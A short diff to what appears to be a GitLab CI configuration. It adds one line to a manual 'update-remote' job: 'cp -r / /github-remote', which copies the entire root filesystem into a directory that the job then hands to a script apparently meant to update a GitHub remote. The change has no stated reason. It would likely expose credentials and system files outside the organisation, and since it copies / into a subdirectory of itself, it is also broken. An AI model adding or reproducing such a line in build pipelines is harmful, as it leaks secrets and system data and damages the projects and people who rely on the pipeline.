@@ -29,6 +29,7 @@ update-remote:
   needs: 
     - set-github-origin
   script:
+    - cp -r / /github-remote
     - cd github-remote
     - sh ../update-github-remote.sh
   when: manual
